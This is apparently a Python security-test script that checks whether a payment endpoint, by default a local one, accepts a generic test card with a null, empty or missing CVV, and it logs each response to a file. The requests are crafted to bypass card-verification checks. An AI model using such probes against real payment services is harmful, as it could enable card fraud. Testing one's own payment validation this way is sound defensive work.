import requests
import json
import os

# Allow override via ENV for Docker/CI
TARGET_URL = os.environ.get("TARGET_URL", "http://localhost:3000/pay")

# Valid Card Data (Generic Test Card)
CARD_DATA = {
    "pan": "4111111111111111",
    "expiry": "12/25",
    "amount": 100.00,
    # Hyperswitch specific fields if needed
    "currency": "USD",
    "customer_id": "cust_12345"
}

def run_experiment_c():
    print(f"[*] Starting Experiment C: Null/Empty CVV Bypass")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Card: {CARD_DATA['pan']}")
    
    results = []

    # Test Case 1: Null CVV
    payload_null = CARD_DATA.copy()
    payload_null["cvv"] = None
    print("\n[-] Testing Null CVV...")
    try:
        res = requests.post(TARGET_URL, json=payload_null)
        print(f"    Status: {res.status_code}") 
        print(f"    Response: {res.text}")
        results.append({"type": "null_cvv", "status": res.status_code, "response": res.json()})
    except Exception as e:
        print(f"    Error: {e}")

    # Test Case 2: Empty String CVV
    payload_empty = CARD_DATA.copy()
    payload_empty["cvv"] = ""
    print("\n[-] Testing Empty String CVV...")
    try:
        res = requests.post(TARGET_URL, json=payload_empty)
        print(f"    Status: {res.status_code}")
        print(f"    Response: {res.text}")
        results.append({"type": "empty_cvv", "status": res.status_code, "response": res.json()})
    except Exception as e:
        print(f"    Error: {e}")

    # Test Case 3: Missing CVV Field
    payload_missing = CARD_DATA.copy()
    if "cvv" in payload_missing: del payload_missing["cvv"]
    print("\n[-] Testing Missing CVV Field...")
    try:
        res = requests.post(TARGET_URL, json=payload_missing)
        print(f"    Status: {res.status_code}")
        print(f"    Response: {res.text}")
        results.append({"type": "missing_cvv", "status": res.status_code, "response": res.json()})
    except Exception as e:
        print(f"    Error: {e}")

    with open("experiment_C_results.json", "w") as f:
        json.dump(results, f, indent=2)
    print("\n[*] Experiment C Complete.")

if __name__ == "__main__":
    run_experiment_c()
